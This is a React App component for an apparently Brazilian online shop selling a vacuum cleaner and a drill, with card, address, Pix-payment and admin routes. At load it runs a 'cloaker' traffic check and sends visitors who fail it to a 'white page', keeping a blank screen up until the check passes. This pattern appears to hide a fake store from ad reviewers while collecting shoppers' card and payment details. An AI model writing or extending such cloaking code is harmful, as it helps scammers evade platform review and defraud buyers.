import React, { useState, useEffect } from "react";
import { BrowserRouter as Router, Routes, Route, Navigate } from "react-router-dom";
import { Toaster } from "sonner";

// Páginas e Componentes
import Index from "./pages/Index";
import AspiradorProductPage from "./products/aspirador-de-po/ProductPage";
import FuradeiraProductPage from "./products/furadeira/ProductPage";
import Checkout from "./pages/Checkout";
import AddCard from "./pages/AddCard";
import AddAddress from "./pages/AddAddress";
import PixPayment from "./pages/PixPayment";
import Admin from "./pages/Admin";
import NotFound from "./pages/NotFound";

// Utilitários de Proteção
import { checkTraffic, redirectToWhitePage } from "./utils/cloaker";

const App = () => {
  const [isSafe, setIsSafe] = useState<boolean | null>(null);

  useEffect(() => {
    const runGuard = async () => {
      const result = await checkTraffic();
      if (!result) {
        redirectToWhitePage();
      } else {
        setIsSafe(true);
      }
    };

    runGuard();
  }, []);

  // Enquanto verifica o tráfego, não renderiza nada da loja
  if (isSafe === null) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        {/* Tela de carregamento neutra */}
      </div>
    );
  }

  return (
    <Router>
      <Toaster position="top-center" richColors />
      <Routes>
        {/* Rotas dos Produtos */}
        <Route path="/" element={<Index />} />
        <Route path="/aspirador-de-po" element={<AspiradorProductPage />} />
        <Route path="/furadeira" element={<FuradeiraProductPage />} />
        
        {/* Fluxo de Checkout Aspirador */}
        <Route path="/aspirador-de-po/checkout" element={<Checkout />} />
        <Route path="/aspirador-de-po/cartao" element={<AddCard />} />
        <Route path="/aspirador-de-po/endereco" element={<AddAddress />} />
        <Route path="/aspirador-de-po/pix" element={<PixPayment />} />

        {/* Fluxo de Checkout Furadeira */}
        <Route path="/furadeira/checkout" element={<Checkout />} />
        <Route path="/furadeira/cartao" element={<AddCard />} />
        <Route path="/furadeira/endereco" element={<AddAddress />} />
        <Route path="/furadeira/pix" element={<PixPayment />} />

        {/* Rotas Administrativas e Utilitários */}
        <Route path="/admin" element={<Admin />} />
        <Route path="/404" element={<NotFound />} />
        <Route path="*" element={<Navigate to="/404" replace />} />
      </Routes>
    </Router>
  );
};

export default App;